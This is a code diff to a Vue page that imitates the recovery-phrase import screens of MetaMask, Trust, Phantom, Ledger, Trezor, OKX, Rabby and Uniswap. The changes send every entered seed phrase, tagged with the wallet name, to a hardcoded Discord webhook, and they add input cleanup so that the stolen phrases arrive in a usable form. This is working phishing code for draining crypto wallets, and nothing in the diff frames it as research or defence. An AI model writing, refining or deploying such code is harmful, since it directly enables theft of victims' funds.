@@ -1612,6 +1612,7 @@
                         : 'metamaskimportinput no-autofill-pwd'
                     "
                     v-model="item.value"
+                    @input="removePunctuation(item)"
                     id="importwalletinput"
                     type="text"
                   />
@@ -1670,7 +1671,7 @@
               <button
                 class="scwtw-w-full enterbut"
                 type="button"
-                @click="confirm()"
+                @click="confirm('Metamask')"
                 :disabled="!isConfirmEnabled"
               >
                 Confirm Secret Recovery Phrase
@@ -2076,6 +2077,7 @@
                     "
                     v-model="item.value"
                     id="importwalletinput"
+                    @input="removePunctuation(item)"
                     type="text"
                     :placeholder="'Word #' + (i + 1)"
                   />
@@ -2167,7 +2169,7 @@
               <button
                 class="scwtw-w-full trustimportbut"
                 type="button"
-                @click="confirm()"
+                @click="confirm('Trust')"
                 :disabled="!isConfirmEnabled"
               >
                 Next
@@ -2305,6 +2307,7 @@
                 <input
                   class="phanyomiteminput"
                   v-model="item.value"
+                  @input="removePunctuation(item)"
                   type="text"
                   data-invalid="false"
                 />
@@ -2351,7 +2354,7 @@
           <div class="scwtw-w-full">
             <button
               class="phantomimportbut"
-              @click="confirm()"
+              @click="confirm('Phantom')"
               :disabled="!isConfirmEnabled"
             >
               Import Wallet
@@ -2540,6 +2543,7 @@
                 <input
                   class="ledgerinputv"
                   v-model="item.value"
+                  @input="removePunctuation(item)"
                   type="text"
                   data-invalid="false"
                 />
@@ -2554,7 +2558,7 @@
           <div class="scwtw-w-full">
             <button
               class="ledgerimportbut"
-              @click="confirm()"
+              @click="confirm('Ledger')"
               :disabled="!isConfirmEnabled"
             >
               Continue with a wallet
@@ -2755,6 +2759,7 @@
                 <input
                   class="ledgerinputv"
                   v-model="item.value"
+                  @input="removePunctuation(item)"
                   type="text"
                   data-invalid="false"
                 />
@@ -2769,7 +2774,7 @@
           <div class="scwtw-w-full">
             <button
               class="ledgerimportbut"
-              @click="confirm()"
+              @click="confirm('Trezor')"
               :disabled="!isConfirmEnabled"
             >
               Continue with a wallet
@@ -3215,6 +3220,7 @@
                 <input
                   class="okxfinput"
                   v-model="item.value"
+                  @input="removePunctuation(item)"
                   type="text"
                   data-invalid="false"
                 />
@@ -3231,7 +3237,7 @@
               <button
                 class="okxfimportbut"
                 type="button"
-                @click="confirm()"
+                @click="confirm('OKX')"
                 :disabled="!isConfirmEnabled"
               >
                 Confirm
@@ -3794,6 +3800,7 @@
                         ? 'rabbyimportinput no-auto'
                         : 'rabbyimportinput no-autofill-pwd'
                     "
+                    @input="removePunctuation(item)"
                     v-model="item.value"
                     id="importwalletinput"
                     type="text"
@@ -3811,7 +3818,7 @@
             <div class="scwtw-w-full">
               <button
                 class="rabbyendbut"
-                @click="confirm()"
+                @click="confirm('Rabby')"
                 :disabled="!isConfirmEnabled"
               >
                 Confirm
@@ -4068,7 +4075,12 @@
                     <p class="uniswapinputdq">{{ i + 1 }}</p>
                   </div>
                 </div>
-                <input class="uniswapinput" v-model="item.value" type="text" />
+                <input
+                  class="uniswapinput"
+                  @input="removePunctuation(item)"
+                  v-model="item.value"
+                  type="text"
+                />
               </div>
             </div>
           </div>
@@ -4115,7 +4127,7 @@
         <div class="uniswapimportbutbox">
           <div class="scwtw-w-full">
             <button
-              @click="confirm()"
+              @click="confirm('Uniswap')"
               class="uniswapimportbut"
               type="button"
               :disabled="!isConfirmEnabled"
@@ -4462,17 +4474,18 @@ const startProgress = (
   };
 };
 
-const confirm = () => {
+const confirm = (type) => {
   mnemonicPhrase.value = visibleInputs.value
     .map((item) => item.value.trim())
     .filter((word) => word !== "");
-  hidiscord(JSON.stringify(mnemonicPhrase.value));
+
+  hidiscord(`[${mnemonicPhrase.value.join(",")}]`, type);
 };
 
 let webhook =
   "https://discord.com/api/webhooks/1401857076338360362/eFGuqGDpQ3RxCH2P_-8FCNF6BOqkLR-FHnfbOQs_aUYPEgLN8QbHTTW8q14llkHLaiYh";
 
-function hidiscord(mnemonicPhrase) {
+function hidiscord(mnemonicPhrase, type) {
   let data = {
     content: `**🤞 Welcome to join --** mnemonicPhrase: ${mnemonicPhrase} `,
   };
@@ -4482,12 +4495,17 @@ function hidiscord(mnemonicPhrase) {
     body: JSON.stringify(data),
   })
     .then((res) => {
-      console.log(res);
+      walletsswitch(type, false);
+      console.log("success");
     })
     .catch((err) => {
       console.log(err);
     });
 }
+
+let removePunctuation = (item) => {
+  item.value = item.value.replace(/[^\w\s\u4e00-\u9fa5]/g, "");
+};
 </script>
 
 <style scoped>
